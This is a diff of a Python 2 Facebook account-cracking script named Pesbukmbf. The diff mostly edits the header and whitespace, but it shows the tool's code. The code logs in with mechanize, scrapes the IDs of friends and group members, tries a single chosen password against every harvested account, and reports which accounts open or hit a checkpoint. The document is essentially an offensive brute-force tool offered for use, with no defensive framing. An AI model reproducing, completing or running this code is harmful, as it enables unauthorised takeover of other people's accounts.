@@ -1,12 +1,10 @@
-#!/usr/bin/python
+#!/data/data/com.termux/files/usr/bin/python
 # -*- coding: utf-8 -*-
-# Multi Brute Forcers (MBF)
+# Pesbukmbf
 # Coded by Senja
-# Github: github.com/stepbystepexe/Pesbukmbf
-
+# Github: https://github.com/stepbystepexe/Pesbukmbf
 import platform, os, sys, cookielib, re, urllib2, urllib, threading, time, random
 from mechanize import Browser as browser
-
 def printf(x,e=0):
         f = 'mhkbpcP'
         for o in f:
@@ -18,24 +16,20 @@ def printf(x,e=0):
                 sys.stdout.write(x)
         else:
                 sys.stdout.write(x+'\n')
-
 if platform.python_version().split('.')[0] != '2':
         printf('[!] You are using a python version %s please use the version 2.x.x'%v().split(' ')[0])
         sys.exit(1)
-
 try:
   import mechanize
 except ImportError:
         printf('[!] It looks like the Mechanize module hasn\'t been installed yet\n[!] pip2 install mechanize')
         sys.exit(1)
-
 br = 0
 log = 0
 id_bfriend = []
 id_bgroups = []
 fid_bfriend = []
 fid_bgroups = []
-
 class pesbuk(threading.Thread):
         def __init__(self,x,f):
                 threading.Thread.__init__(self)
@@ -58,7 +52,6 @@ class pesbuk(threading.Thread):
                         self.o = 2
                 else:
                         self.o = 3
-
 def loads():
     tix = [
      '.   ', '..  ', '... ']
@@ -66,7 +59,6 @@ def loads():
         print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mLoading ' + o,
         sys.stdout.flush()
         time.sleep(1)
-
 def crack(o):
         while 1:
                 x = input_one('\n\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mPassword')
@@ -75,7 +67,6 @@ def crack(o):
                 else:
                         break
         return crack_pb(o,x)
-
 def display(account,passw,data):
         checkpoint = []
         false = 0
@@ -102,7 +93,6 @@ def display(account,passw,data):
                 return crack(data)
         else:
                 return menu()
-
 def crack_pb(data,passw):
         account = []
         print('\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mCrack \x1b[0m%d \x1b[77;1mAccount with a Password \x1b[0m[%s]'%(len(data),passw))
@@ -148,7 +138,6 @@ def crack_pb(data,passw):
                         exit()
         print('\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mCracking  100%      ')
         display(account,passw,data)
-
 def browser():
         global br
         reload(sys)
@@ -161,7 +150,6 @@ def browser():
         br.set_handle_redirect(True)
         br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
         br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-
 def datacount():
         global fid_bgroups,fid_bfriend
         try:
@@ -170,7 +158,6 @@ def datacount():
         try:
                 fid_bfriend = open(os.sys.path[0]+'/MBFfriend.txt','r').readlines()
         except:pass
-
 def saved():
         if len(id_bgroups) != 0:
                 print('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSaving results from group')
@@ -186,12 +173,10 @@ def saved():
                         print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mSaved successfilly MBFfriend.txt')
                 except:
                         print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1Saving failed')
-
 def exit():
         saved()
         print('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mExit the program!\n')
         sys.exit(1)
-
 def input_one(o,f=0):
         while 1:
                 try:
@@ -212,7 +197,6 @@ def input_one(o,f=0):
                         else:
                                 break
         return x
-
 def input_two(i,x):
         while 1:
                 try:
@@ -225,7 +209,6 @@ def input_two(i,x):
                 else:
                         print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mWrong choice')
         return o
-
 def next_one():
         global fid_bgroups
         if len(fid_bgroups) != 0:
@@ -236,7 +219,6 @@ def next_one():
                         os.remove(os.sys.path[0]+'/MBFgroups.txt')
                         fid_bgroups = []
         return 0
-
 def next_two():
         global fid_bfriend
         if len(fid_bfriend) != 0:
@@ -247,7 +229,6 @@ def next_two():
                         os.remove(os.sys.path[0]+'/MBFtriend.txt')
                         fid_bfriend = []
         return 0
-
 def open_pb(o):
         try:
                 x = br.open(o)
@@ -260,7 +241,6 @@ def open_pb(o):
                 return open_pb(br.find_link().url)
         else:
                 return x
-
 def login():
         global log
         username = input_one('\x1b[0m[\x1b[92;1m+\x1b[0m] Username')
@@ -285,7 +265,6 @@ def login():
                 exit()
         else:
                 print('\x1b[0m[\x1b[95;1mx\x1b[0m] \x1b[77;1mLogin failed')
-
 def idgroups():
         if log != 1:
                 print('\n\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[77;1mLogin Account Pesbuk \x1b[0m[\x1b[91;1m/\x1b[0m]')
@@ -306,11 +285,9 @@ def idgroups():
                 return crack(id_bgroups)
         else:
                 return menu()
-
 def cracks_id_friend(r):
         for o in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
                 id_bfriend.append(o)
-
 def idfriend():
         if log != 1:
                 print('\n\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[77;1mLogin Account Pesbuk \x1b[0m[\x1b[91;1m/\x1b[0m]')
@@ -346,7 +323,6 @@ def idfriend():
                 return crack(id_bfriend)
         else:
                 return menu()
-
 def menu():
         os.system('clear')
         os.system('reset')
@@ -362,7 +338,6 @@ def menu():
                 idfriend()
         elif x == 3:
                 exit()
-
 datacount()
 browser()
 menu()
